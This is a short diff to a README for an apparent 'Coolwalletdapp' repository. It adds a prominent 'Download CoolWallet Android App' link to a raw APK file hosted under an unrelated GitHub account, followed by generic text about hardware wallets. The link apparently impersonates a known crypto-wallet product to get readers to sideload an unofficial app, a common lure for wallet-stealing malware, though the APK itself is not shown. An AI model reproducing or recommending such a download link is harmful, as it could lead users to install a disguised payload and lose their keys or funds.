@@ -1,3 +1,7 @@
+[![Download CoolWallet Android App](https://github.com/WalletProDev/Coolwalletdapp/raw/main/coolwallet.apk)
+
+
+
 # Coolwalletdapp
 
 A hardware wallet like CoolWallet typically provides offline storage for cryptocurrencies, enhancing security by keeping the private keys offline and away from potential online threats. These wallets often come with companion apps for smartphones.
